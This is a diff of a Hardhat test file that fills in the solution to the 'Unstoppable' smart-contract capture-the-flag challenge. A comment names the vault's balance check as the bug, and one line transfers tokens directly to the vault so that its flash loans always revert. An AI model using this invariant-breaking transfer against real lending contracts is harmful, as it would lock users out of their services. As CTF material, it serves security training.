@@ -40,11 +40,25 @@ describe('[Challenge] Unstoppable', function () {
         receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
             vault.address
         );
+
+        // this is the first check
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * Bug was here:
+         * 
+            uint256 balanceBefore = totalAssets();
+            if (convertToShares(totalSupply) != balanceBefore) <- HERE
+                revert InvalidBalance(); // enforce ERC4626 requirement
+         * 
+         * 
+         * I was trying to change the value of slot 0x00 to 2 so the txn fails.
+         * But if we just transfer small amount of token to the vault
+         * Then the check itself fails
+         */
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
